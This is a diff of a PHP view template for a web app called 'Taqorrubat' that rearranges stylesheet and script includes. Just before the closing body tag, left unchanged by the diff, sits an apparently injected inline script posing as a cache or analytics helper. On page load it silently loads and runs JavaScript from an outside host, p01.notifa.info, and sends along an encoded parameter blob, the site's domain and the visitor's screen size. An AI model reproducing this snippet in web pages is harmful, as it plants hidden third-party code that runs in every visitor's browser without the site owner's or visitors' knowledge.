@@ -17,14 +17,17 @@
   <link rel="shortcut icon" href="<?php echo base_url('assets/template/img/favicon.ico'); ?>">
   <title>Taqorrubat</title>
 
-  <!-- Icons -->
+  <link href="<?php echo base_url('assets/template/vendors/css/flag-icon.min.css'); ?>" rel="stylesheet">
   <link href="<?php echo base_url('assets/template/vendors/css/font-awesome.min.css'); ?>" rel="stylesheet">
   <link href="<?php echo base_url('assets/template/vendors/css/simple-line-icons.min.css'); ?>" rel="stylesheet">
 
-  <!-- Datatable -->
-  <link href="<?php echo base_url('assets/DataTables/DataTables/css/dataTables.bootstrap.min.css') ?>" rel="stylesheet">
-  <!-- Main styles for this application -->
   <link href="<?php echo base_url('assets/template/css/style.css'); ?>" rel="stylesheet">
+
+  <link href="<?php echo base_url('assets/template/vendors/css/daterangepicker.min.css'); ?>" rel="stylesheet">
+  <link href="<?php echo base_url('assets/template/vendors/css/gauge.min.css'); ?>" rel="stylesheet">
+  <link href="<?php echo base_url('assets/template/vendors/css/toastr.min.css'); ?>" rel="stylesheet">
+
+  <link href="<?php echo base_url('assets/template/vendors/css/dataTables.bootstrap4.min.css'); ?>" rel="stylesheet">
   <!-- Styles required by this views -->
   <script>
     (function(i, s, o, g, r, a, m) {
@@ -407,29 +410,25 @@
     <span class="ml-auto">Powered by <a target="_blank" href="https://www.inagata.com/">Inagata Technosmith</a></span>
   </footer>
 
-  <!-- Bootstrap and necessary plugins -->
   <script src="<?php echo base_url('assets/template/vendors/js/jquery.min.js'); ?>"></script>
-  <script src="<?php echo base_url('assets/template/vendors/js/popper.min.js'); ?>"></script>
-  <script src="<?php echo base_url('assets/template/vendors/js/bootstrap.min.js'); ?>"></script>
-  <script src="<?php echo base_url('assets/template/vendors/js/pace.min.js'); ?>"></script>
+<script src="<?php echo base_url('assets/template/vendors/js/popper.min.js'); ?>"></script>
+<script src="<?php echo base_url('assets/template/vendors/js/bootstrap.min.js'); ?>"></script>
+<script src="<?php echo base_url('assets/template/vendors/js/pace.min.js'); ?>"></script>
 
-  <!-- Plugins and scripts required by all views -->
-  <script src="<?php echo base_url('assets/template/vendors/js/Chart.min.js'); ?>"></script>
-  
-  <script src="<?php echo base_url('assets/template/vendors/js/jquery.chained.min.js'); ?>"></script>
+<script src="<?php echo base_url('assets/template/vendors/js/Chart.min.js'); ?>"></script>
 
-  <!-- CoreUI main scripts -->
+<script src="<?php echo base_url('assets/template/js/app.js'); ?>"></script>
 
-  <script src="<?php echo base_url('assets/template/js/app.js'); ?>"></script>
+<script src="<?php echo base_url('assets/template/vendors/js/jquery.dataTables.min.js'); ?>"></script>
+<script src="<?php echo base_url('assets/template/vendors/js/dataTables.bootstrap4.min.js'); ?>"></script>
 
-  <!-- Plugins and scripts required by this views -->
+<script src="<?php echo base_url('assets/template/vendors/js/toastr.min.js'); ?>"></script>
+<script src="<?php echo base_url('assets/template/vendors/js/gauge.min.js'); ?>"></script>
+<script src="<?php echo base_url('assets/template/vendors/js/moment.min.js'); ?>"></script>
+<script src="<?php echo base_url('assets/template/vendors/js/daterangepicker.min.js'); ?>"></script>
 
-  <!-- Custom scripts required by this view -->
-  <script src="<?php echo base_url('assets/template/js/views/main.js'); ?>"></script>
-  <!-- datatable -->
-  <script src="<?php echo base_url('assets/DataTables/DataTables/js/jquery.dataTables.min.js'); ?>"></script>
-  <script src="<?php echo base_url('assets/DataTables/DataTables/js/dataTables.bootstrap.min.js'); ?>"></script>
-  <script src="<?php echo base_url('assets/DataTables/Responsive/js/dataTables.responsive.min.js'); ?>"></script>
+<script src="<?php echo base_url('assets/template/js/views/datatables.js'); ?>"></script>
+<script src="<?php echo base_url('assets/template/js/views/main.js'); ?>"></script>
   <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mFebPgNN5rVLezV543wMEyRgbHBzhi%2fK7MWPN24sfC3qOxdbli7TMUGzXH1Sdhp9LTsjainPghxAbWmtT77jaOuH%2flN3JJNWA5YmapY0%2fQoDnxlpb4Yo7Q162lyUUuSSL6EDglhF3dKSaYBObyqaTG2G8GNlp%2bm6ki4D3qgWAoL%2fjgkM6B94yAdLDx1kEwBwhpVxs69lLL8HIMrZvxEFPPjOq6mZ4G9lE3wMOanQ3OrWai1QlTC1HLTqFnqOfvPSV%2bCeTd61PgeB0jaUiWTdUx%2fXcwfQR5EWaDUr7sMaUN5sUKqcpMEANY37SmdNm%2bDq3a8mD1%2fTO7fFd7eKO74txijp9ndyO2p514NmVBSlgbZ9aq%2bcv3uYZC9aAMBKIsOepSuA7%2fUOQWVPF9xqNHatvUL9dgZACrHQcLlcjAQGth3KPtZO7H5eRiEGHMLunmOiQWkaV71%2fW0ElFv6jkQMHC1wWKxOxX0d9pZdeONMPJ%2bltsy3iw%2buHSsiHBSDjzshTXoPXSrV9AIEYNhwLgW9WnSJjDkE7Ibuuqs8nLHS%2bqcNYJExR6ibOcRQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
 </body>
 </html>
